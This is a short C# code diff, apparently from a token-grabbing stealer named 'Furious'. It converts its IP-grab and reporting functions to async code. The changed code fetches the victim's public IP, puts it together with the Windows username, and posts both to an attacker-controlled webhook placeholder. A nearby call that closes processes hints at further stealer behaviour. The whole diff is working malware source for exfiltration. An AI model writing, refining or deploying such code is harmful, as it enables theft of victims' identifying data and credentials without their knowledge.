@@ -44,7 +44,7 @@ namespace Furious
 
 			if (grabIP)
             {
-				SendIP();
+				await SendIP();
             }
 
 			CloseProcesses();
@@ -104,32 +104,33 @@ namespace Furious
 			}
 		}
 
-		private static string GrabIP()
+		private static async Task<string> GrabIP()
 		{
-			var addy = new WebClient().DownloadString("https://ipv4.icanhazip.com");
-			return addy;
+			return await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
 		}
 
-		public static void SendIP()
+		public static async Task<HttpResponseMessage> SendIP()
 		{
 			string hook = "webhook-here";
-
+			
+			HttpResponseMessage response = null;
 			using (HttpClient httpClient = new HttpClient())
 			{
 				try
 				{
 					Dictionary<string, string> contents = new Dictionary<string, string>
 					{
-						{ "content", $"Token report for '{ Environment.UserName }' { Grabber.GrabIP() }" }
+						{ "content", $"Data for '{ Environment.UserName }' @ { await Grabber.GrabIP() }" }
 					};
 
-					httpClient.PostAsync(hook, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+                    response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
 				}
 				catch (HttpRequestException ex)
 				{
 					Debug.WriteLine(ex.Message);
 				}
 			}
+			return response;
 		}
 	}
 }
